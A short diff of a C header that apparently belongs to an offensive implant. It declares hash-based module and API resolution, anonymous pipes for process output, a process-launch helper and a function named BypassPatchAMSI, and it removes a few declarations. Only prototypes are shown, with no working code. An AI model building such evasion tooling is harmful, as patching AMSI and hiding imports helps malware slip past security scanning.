@@ -33,9 +33,6 @@ typedef struct _ANONPIPE
 {
     HANDLE StdOutRead;
     HANDLE StdOutWrite;
-
-    HANDLE StdInRead;
-    HANDLE StdInWrite;
 } ANONPIPE, *PANONPIPE;
 
 typedef struct
@@ -115,6 +112,9 @@ PVOID    LdrModulePeb( DWORD hash );
 PVOID    LdrModuleLoad( LPSTR ModuleName );
 
 /*!
+ * Starts a Process
+ *
+ * @param EnableWow64 start 32-bit/wow64 process
  * @param App App path
  * @param CmdLine Process to run
  * @param Flags Process Flags
@@ -149,7 +149,5 @@ VOID        AnonPipesClose( PANONPIPE AnonPipes );
 
 BOOL        BypassPatchAMSI( );
 ULONG       RandomNumber32( VOID );
-UINT_PTR    HashStringEx( LPVOID String, UINT_PTR Length );
 UINT_PTR    HashEx( LPVOID String, UINT_PTR Length, BOOL Upper );
-BOOL        Win32_CreateProcessA( );
 #endif
